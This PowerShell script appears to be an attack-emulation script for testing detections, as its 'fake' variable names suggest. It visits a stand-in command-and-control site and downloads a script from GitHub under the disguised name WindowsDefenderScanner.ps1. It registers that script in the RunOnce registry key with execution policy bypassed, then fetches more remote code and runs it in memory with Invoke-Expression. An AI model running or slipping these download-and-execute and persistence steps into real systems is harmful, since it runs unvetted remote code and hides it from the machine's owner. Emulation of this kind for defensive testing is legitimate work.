 ### Just gets some host info
Get-Host -Verbose | select name,Runspace


####Emulates site visit
$visit_fake_cnc_website = Invoke-WebRequest -Uri https://cheese.com


##### Downloads PS script and sets it to the reg key runonce
Invoke-WebRequest -Uri https://raw.githubusercontent.com/juli0mendez/testfiles/main/HellowWolf.ps1 -OutFile C:\temp\WindowsDefenderScanner.ps1

#The Name of the Registry Key in the Autorun-Key.
$KeyName = 'Run'

#Command to run
$Command = '%systemroot%\System32\WindowsPowerShell\v1.0\powershell.exe -executionpolicy bypass -file C:\temp\WindowsDefenderScanner.ps1'

    
    if (-not ((Get-Item -Path HKLM:\Software\Microsoft\Windows\CurrentVersion\RunOnce).$KeyName ))
    {
        New-ItemProperty -Path 'HKLM:\Software\Microsoft\Windows\CurrentVersion\RunOnce' -Name $KeyName -Value $Command -PropertyType ExpandString
    }
    else
    {
        Set-ItemProperty -Path 'HKLM:\Software\Microsoft\Windows\CurrentVersion\RunOnce' -Name $KeyName -Value $Command -PropertyType ExpandString
    }


#### Executes Powershell directly from GitHub
$RunFakeFilelessMalware = Invoke-WebRequest https://raw.githubusercontent.com/juli0mendez/testfiles/main/get_ad_logons.ps1
Invoke-Expression $($RunFakeFilelessMalware.Content) 
